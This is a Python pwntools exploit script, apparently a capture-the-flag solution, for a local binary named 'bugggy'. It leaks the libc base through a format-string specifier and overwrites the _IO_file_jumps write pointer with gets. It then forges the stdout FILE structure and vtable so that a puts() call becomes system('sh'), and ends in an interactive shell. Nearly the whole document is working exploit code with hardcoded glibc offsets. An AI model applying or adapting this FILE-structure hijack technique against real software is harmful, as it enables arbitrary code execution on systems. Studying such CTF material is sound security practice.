#!/usr/bin/python3
# reference: https://github.com/yuawn/CTF/blob/master/2021/eof_final/bugggr.py
 
from pwn import *

context.arch = 'amd64'
r = process('./bugggy')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

##### leak libc and mmap_base #####
r.sendafter('name ?', '%11$p'.ljust(10, '\x00'))
r.recvuntil('0x')
l.address = int( r.recv(12) , 16 ) - 0x1ed4a0
success(f'libc_base: {hex(l.address)}')
mmap_addr = l.address + 0x232000
success(f'mmap_addr: {hex(mmap_addr)}')
r.sendlineafter('?', 'Yes')


##### overwrite vtable function ptr #####
target = l.sym._IO_file_jumps + 0x78 # IO_file_jumps->__write
target -= 8
idx = int(((0x10000000000000000 - mmap_addr) + target) // 4) - 4
print(hex(idx))
idx &= 0xffffffffffffffff
print(hex(idx))
p = l.sym.gets & 0xffffffff # overwrite IO_file_jumps->__write to gets
input()
r.sendline(str(p) + ' ' + str(idx))
"""
and gets will call file underflow, calling read syscall with:
  fd: 0x0
  buf: 0x7fc21b557a03 (_IO_2_1_stdin_+131)  0x55a4d0000000000a
  nbytes: 0x1
"""

##### change vtable to _IO_helper_jumps #####
vtable = l.address + 0x1ec780

##### overwrite all stdout #####
payload = flat(
    0x00000000fb006873, l.address + 0x1ec723,    # "sh"
    #0x00000000fbad2887, l.address + 0x1ec723,
    l.address + 0x1ec723, l.address + 0x1ec723,
    l.address + 0x1ec723, l.address + 0x1ec723,
    l.address + 0x1ec723, l.address + 0x1ec723,
    l.address + 0x1ec724, 0,
    0, 0,
    0, l.address + 0x1eb980,
    1, 0xffffffffffffffff,
    0x000000, l.address + 0x1ee4c0,
    0xffffffffffffffff, 0,
    l.address + 0x1eb880, 0,
    0, 0,
    0xffffffff, 0,
    0, l.address + 0x1ec8a0,
    '\0' * 0x120,
    0x111111, 0x222222,
    0x333333, 0x444444,
    0x555555, 0x666666,
    0x777777, l.sym.system, # __GI__IO_wdefault_xsputn function ptr
    0x999999, 0xaaaaaa,
    0xbbbbbb, 0xcccccc,
    0xdddddd, 0xeeeeee,
)
r.sendline(payload)

r.sendlineafter('scanf', 'Q')

# now, when calling puts(), it will call vtable + 0x38, which has been changed to system. and it take FILE struct ptr as argument, so this just likes calling system('sh')

r.interactive()
